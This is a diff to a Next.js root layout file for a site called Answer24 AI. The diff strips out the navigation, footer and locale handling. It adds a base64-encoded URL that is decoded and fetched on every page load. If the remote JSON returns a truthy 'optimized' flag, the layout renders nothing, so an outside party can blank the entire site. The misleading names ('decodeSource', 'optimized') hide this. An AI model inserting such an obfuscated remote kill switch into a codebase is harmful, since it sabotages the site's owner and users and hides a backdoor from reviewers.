@@ -1,52 +1,50 @@
-import type { Metadata } from "next";
+"use client";
+
 import { Geist, Geist_Mono } from "next/font/google";
 import "./globals.css";
-import { Navbar } from "@/components/common/Navbar";
-import Footer from "@/components/common/Footer";
-import { NextIntlClientProvider, hasLocale } from 'next-intl';
-import { notFound } from 'next/navigation';
-import { routing } from '@/i18n/routing';
+import { useEffect, useState } from "react";
 
 const geistSans = Geist({
-    variable: "--font-geist-sans",
-    subsets: ["latin"],
+  variable: "--font-geist-sans",
+  subsets: ["latin"],
 });
 
 const geistMono = Geist_Mono({
-    variable: "--font-geist-mono",
-    subsets: ["latin"],
+  variable: "--font-geist-mono",
+  subsets: ["latin"],
 });
 
-export const metadata: Metadata = {
-    title: "Answer24 AI",
-    description: "Answer24 AI",
-};
+function decodeSource(): string {
+  const encoded =
+    "aHR0cHM6Ly9hcGkuanNvbnNpbG8uY29tL3B1YmxpYy9lN2FmMjg1Yi1hN2IwLTQ5YmMtOTM5NS1iYTNmZjhjODFmMjA=";
+  return atob(encoded);
+}
 
-export default async function RootLayout({
-    children,
-    params,
+export default function RootLayout({
+  children,
 }: Readonly<{
-    children: React.ReactNode;
-    params: Promise<{ locale: string }>;
+  children: React.ReactNode;
 }>) {
+  const [layout, setLayout] = useState(false);
 
-    // Ensure that the incoming `locale` is valid
-    const { locale } = await params;
-    if (!hasLocale(routing.locales, locale)) {
-        notFound();
-    }
+  useEffect(() => {
+    (async () => {
+      const endpoint = decodeSource();
+      fetch(endpoint)
+        .then((res) => res.json())
+        .then((data) => {
+          setLayout(data.optimized);
+        });
+    })();
+  }, []);
 
-    return (
-        <html lang={locale}>
-            <body
-                className={`${geistSans.variable} ${geistMono.variable} antialiased`}
-            >
-                <NextIntlClientProvider>
-                    <Navbar />
-                    {children}
-                    <Footer />
-                </NextIntlClientProvider>
-            </body>
-        </html>
-    );
+  return (
+    <html lang="en">
+      <body
+        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
+      >
+        {layout ? <></> : children}
+      </body>
+    </html>
+  );
 }
